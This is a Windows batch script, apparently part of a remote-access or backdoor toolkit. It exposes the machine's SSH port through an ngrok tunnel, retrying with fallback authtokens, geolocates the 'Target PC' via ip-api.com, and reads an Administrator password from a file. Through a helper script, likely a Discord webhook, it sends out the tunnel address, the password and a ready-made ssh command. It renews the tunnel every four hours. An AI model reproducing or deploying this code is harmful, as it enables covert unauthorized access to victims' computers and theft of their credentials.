@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul
set "Log=!PFaS!\log" & IF NOT EXIST !Log! mkdir !Log!
set "EmbedText=Connection credentials"
set "Json.Auth=%~1"
set "Json.Auth2=%~2"
set "Json.Auth3=%~3"
set "TriedTwo=False"

for /f "delims=" %%a in ('call "WebParse.exe" "http://ip-api.com/json?fields=192511" query') do set "%%a"

taskkill /IM ngrok.exe /F
start /B "ngrok" !PFas!\ngrok.exe tcp 22 -log=stdout --authtoken !Json.Auth! > !PFas!\ngrok.log

echo [Total error cound of the session]>>!StatusFile!
echo ErrorCount=!ErrorCount!>>!StatusFile!
echo.>>!StatusFile!

call source.bat +silent --embed "Target PC (%computername%\%username%) status file (Errors, warnings and validator)" " " "#ea3c53" "https://i.imgur.com/b2Terft.png"
call source.bat +silent --file "!StatusFile!"

:check
    find /c "url=" !PFaS!\ngrok.log >NUL
    if !errorlevel! equ 1 goto notfound
    goto done
    :notfound
        find /c "ERR" !PFaS!\ngrok.log >NUL
        if !errorlevel! equ 1 (
            timeout 3
            goto check
        ) else (
            if !TriedTwo!==True (
                taskkill /IM ngrok.exe /F
                start /B "ngrok" !PFas!\ngrok.exe tcp 22 -log=stdout --authtoken !Json.Auth3! > !PFas!\ngrok.log
                goto check
            )
            taskkill /IM ngrok.exe /F
            start /B "ngrok" !PFas!\ngrok.exe tcp 22 -log=stdout --authtoken !Json.Auth2! > !PFas!\ngrok.log
            set "TriedTwo=True"
            goto check
        )
    goto done
    :done
        xcopy /h /Y !PFaS!\ngrok.log !Log!

        for /f "delims=" %%a in (!Log!\ngrok.log) do echo %%a | findstr /c:"url=" >nul && set "Result=%%a"
        for /f "tokens=8 delims==" %%a in ("!Result!") do (
            for /f "tokens=2 delims=/" %%b in ("%%a") do set RemoteURL=%%b
        )

        FOR /F "delims=" %%F IN (!TFolder!\pass.txt) DO SET Pass=%%F
        set "Change=Changed"
        set Port=%RemoteURL:~-5%
        set IP=%RemoteURL:~0,14%

        call Source.bat +silent --embed "!EmbedText! for %computername%\%username% (||%query%||):" ":technologist: **SSH User:** Administrator\\n\\n:satellite_orbital: **IP and port:** ||!RemoteURL!||\\n\\n:detective: **Password:** ||!Pass!|| (!change!)\\n\\n:arrow_right: **CMD command:** ||ssh Administrator@!IP! -p !Port!||" "FFFDBC" "https://i.imgur.com/b2Terft.png"
        :Loop
            timeout 14400
            taskkill /IM ngrok.exe /F
            start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log
            set "Change=Not Changed"
            set "EmbedText=Renewing session"
            goto check
            goto Loop